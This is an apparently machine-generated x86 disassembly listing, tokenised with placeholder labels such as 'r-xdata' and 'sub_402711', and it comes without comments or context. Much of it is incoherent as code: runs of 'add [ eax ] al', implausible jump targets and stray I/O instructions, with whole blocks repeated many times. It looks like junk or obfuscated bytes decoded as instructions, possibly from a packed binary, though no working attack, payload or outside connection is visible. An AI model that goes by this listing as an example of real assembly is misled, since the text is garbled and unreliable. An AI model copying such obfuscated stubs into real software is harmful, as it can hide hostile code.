or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
jg r-xdata
jge 0xffffffffc0099c32
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe2499eb
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc646b80
mov eax 0xff64870f
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_402692
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec14641
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18aac1c
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1000e27
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_402661
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c335fe
call 0xffffffffcec1688b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4b8a7
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc0099c32
mov eax 0xff64870f
jg r-xdata
jl 0xe2499eb
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc646b80
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_402711
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1e960
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jpo 0x36287f59
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287fa9
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9afe
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_40273e
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120aa57
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcaa30
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e960
ja r-xdata
jmp 0xffffffffe7287fa9
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f59
jno r-xdata
jno 0xffffffffff13af89
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f13
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9afe
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aaba
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40278e
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e960
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f59
jg r-xdata
jge 0xffffffffe1c13f13
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7287fa9
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13af89
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100aaba
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_4027c0
jg r-xdata
push ecx
push edi
call sub_402840
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e960
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f59
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe7287fa9
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jno r-xdata
jno 0xffffffffff13af89
ja r-xdata
mov eax 0xff64870f
ja r-xdata
mov edi 0xcf81337f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f13
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9afe
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aaba
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_40281c
jae r-xdata
push esp
push edx
call sub_40278e
add edi 0x815a7f58
neg [ ecx + 0x5a ]
jns r-xdata
xor ebx 0x7504c483
stosb [ edi ]
jge r-xdata
jb 0x120aa57
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcaa30
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1e960
ja r-xdata
jmp 0xffffffffe7287fa9
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36287f59
jno r-xdata
jno 0xffffffffff13af89
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c13f13
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101b9afe
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100aaba
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4029e1
pop edx
jns r-xdata
jne r-xdata
add ecx 0x54bf0a75
jne r-xdata
push ecx
call sub_4029e1
jmp [ 0x70246c83 ]
sub ebx 0x81f9795a
shl [ ebp + 0xa ] 0xbf
push esp
sub [ esp + 0x70 ] 0x2
sub esp 0x8
jge r-xdata
mov edi 0xf1e85154
jno r-xdata
add eax 0xe89c5656
add eax 0xb9000000
jae r-xdata
add ecx 0x53575255
call sub_402a19
jne 0xffffffffa3a5108c
push esi
push esi
pushfd
call sub_402a0a
mov ecx 0xc1810d71
push ebp
push edx
push edi
push ebx
mov [ fs : 0xffffffff9c248481 ] eax
add [ eax ] al
add [ edi - 0x7cffbfd6 ] ah
in al dx
add al 0x77
add eax 0xf0673e9
mov [ ebp + 0x9 ] esi
add edx 0x5e855
add [ eax ] al
mov ecx 0x850fef7f
jmp [ esp + 0xa8 ]
sub_402a19
add [ esp + 0x9c ] r-xdata
sub esp 0x4
ja r-xdata
jne r-xdata
jmp 0xffffffff894f30a1
jg r-xdata
add edx 0x5e855
add [ eax ] al
jae r-xdata
jne 0xffffffffa864cf40
mov ecx 0x850fef7f
push ebp
call sub_402a3d
jns 0xffffffffc2c133a7
add [ eax ] al
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7508ec83 ] bh
adc al 0x81
out 0x53 eax
push eax
call sub_402a60
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a58
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef2c
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a91
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x80 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x90 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x74 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
